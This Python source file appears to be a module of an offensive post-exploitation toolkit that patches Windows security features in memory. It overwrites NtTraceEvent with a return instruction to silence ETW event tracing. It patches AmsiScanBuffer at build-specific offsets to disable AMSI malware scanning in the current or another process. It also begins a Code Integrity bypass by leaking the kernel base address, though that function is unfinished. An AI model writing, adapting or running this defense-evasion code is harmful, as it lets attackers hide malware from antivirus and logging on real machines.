import eternalhush as eh
from additional.clingyspider import api
from additional.clingyspider import const
from additional.clingyspider import extapi
from additional import memrwlib
from additional.clingyspider.nt_const import *
import additional.darknarrator as dana
import os

FORCE_RET_INSTRUCTION = b"\xc3"
JMP_INSTRUCTION = b"\x75"

def patch_etw(hproc, patch):
    if hproc != api.GetCurrentProcess():
        ntdll_dll = api.MemGetModuleHandleEx(hproc, 'ntdll.dll')
    else:
        ntdll_dll = api.MemGetModuleHandle('ntdll.dll')
    if not ntdll_dll:
        if eh.ui.GetLastError() == 0x6:
            eh.ui.Echo("ntdll.dll not loaded in process!", eh.ECHO_WARNING)
            return
        eh.ui.Echo("Failed to get ntdll.dll handle", eh.ECHO_ERROR)
        return
    if hproc != api.GetCurrentProcess():
        nttraceevent = api.MemGetProcAddressEx(hproc, ntdll_dll, 'NtTraceEvent')
    else:
        nttraceevent = api.MemGetProcAddress(ntdll_dll, 'NtTraceEvent')
    eh.ui.Echo("Patching NtTraceEvent {}".format(hex(nttraceevent)), eh.ECHO_DEFAULT)

    old_bytes = api.ReadMemoryEx(hproc, nttraceevent, len(patch))
    if eh.ui.GetEnv("__PATCHTOOL_NTTRACEEVENT_OLD") == "":
        eh.ui.SetEnv("__PATCHTOOL_NTTRACEEVENT_OLD", old_bytes.hex())

    old = api.VirtualProtectEx(hproc, nttraceevent, 4096, const.PAGE_EXECUTE_READWRITE)
    api.WriteMemoryEx(hproc, nttraceevent, patch)
    api.VirtualProtectEx(hproc, nttraceevent, 4096, old)
    
def patch_amsi(hproc, patch):
    if hproc != api.GetCurrentProcess():
        amsi_dll = api.MemGetModuleHandleEx(hproc, 'amsi.dll')
    else:
        amsi_dll = api.MemGetModuleHandle('amsi.dll')
    if not amsi_dll:
        if eh.ui.GetLastError() == 0x6:
            eh.ui.Echo("amsi.dll not loaded in process!", eh.ECHO_WARNING)
            return
        eh.ui.Echo("Failed to get amsi.dll handle", eh.ECHO_ERROR)
        return
    if hproc != api.GetCurrentProcess():
        amsiscanbuffer = api.MemGetProcAddressEx(hproc, amsi_dll, 'AmsiScanBuffer')
    else:
        amsiscanbuffer = api.MemGetProcAddress(amsi_dll, 'AmsiScanBuffer')
    eh.ui.Echo("Patching AmsiScanBuffer {}".format(hex(amsiscanbuffer)), eh.ECHO_DEFAULT)

    patch_offset = 0x95
    if not api.IsX64():
        patch_offset = 0x61
    if int(eh.ui.GetEnv('BUILDNO_MAJOR')) >= 22000:
        patch_offset = 0x84

    old_bytes = api.ReadMemoryEx(hproc, amsiscanbuffer+patch_offset, len(patch))
    if eh.ui.GetEnv("__PATCHTOOL_AMSISCANBUFFER_OLD") == "":
        eh.ui.SetEnv("__PATCHTOOL_AMSISCANBUFFER_OLD", old_bytes.hex())

    old = api.VirtualProtectEx(hproc, amsiscanbuffer, 4096, const.PAGE_EXECUTE_READWRITE)
    api.WriteMemoryEx(hproc, amsiscanbuffer+patch_offset, patch)
    api.VirtualProtectEx(hproc, amsiscanbuffer, 4096, old)
#4C 8D 05 6E 1F 46 00
def patch_ci():
    if not dana.DANA_IsReady():
        eh.ui.Echo("DarkNarrator is not loaded/configured", eh.ECHO_ERROR)
        return
    
    ntoskrnl_addr = extapi.InvokeUserExtensionApi(dana.DANA_LEAK_MODULE_ADDR, "\\SystemRoot\\system32\\ntoskrnl.exe")
    if not ntoskrnl_addr:
        eh.ui.Echo(f"Failed to leak kernel address ({eh.ui.GetLastError()})", eh.ECHO_ERROR)
        return
    eh.ui.Echo(f"Kernel address:\t{hex(ntoskrnl_addr)}", eh.ECHO_DEFAULT)
    
    


def main(args):
    if args.protection.lower() not in ['amsi', 'etw', 'ci']:
        eh.ui.Echo("Invalid protection specified. Use .help", eh.ECHO_ERROR)
        return
    if args.action.lower() not in ['patch', 'restore']:
        eh.ui.Echo("Invalid action specified. Use .help", eh.ECHO_ERROR)
        return
    hproc = args.use_handle
    if not args.use_handle:
        if not args.pid:
            hproc = api.GetCurrentProcess()
        else:
            hproc = api.GetProcessHandle(args.pid, const.PROCESS_ALL_ACCESS)

    if not hproc:
        eh.ui.Echo("Failed to open target process handle", eh.ECHO_ERROR)
        return
    
    if args.action.lower() == "patch":
        if args.protection.lower() == "etw":
            patch_etw(hproc, FORCE_RET_INSTRUCTION)
        elif args.protection.lower() == "amsi":
            patch_amsi(hproc, JMP_INSTRUCTION)
        elif args.protection.lower() == "ci":
            patch_ci()
    elif args.action.lower() == "restore":
        if args.protection.lower() == "etw":
            patch_etw(hproc, bytes.fromhex(eh.ui.GetEnv('__PATCHTOOL_NTTRACEEVENT_OLD')))
        elif args.protection.lower() == "amsi":
            patch_amsi(hproc, bytes.fromhex(eh.ui.GetEnv('__PATCHTOOL_AMSISCANBUFFER_OLD')))
    

    if hproc != api.GetCurrentProcess() and not args.use_handle:
        api.CloseHandle(hproc)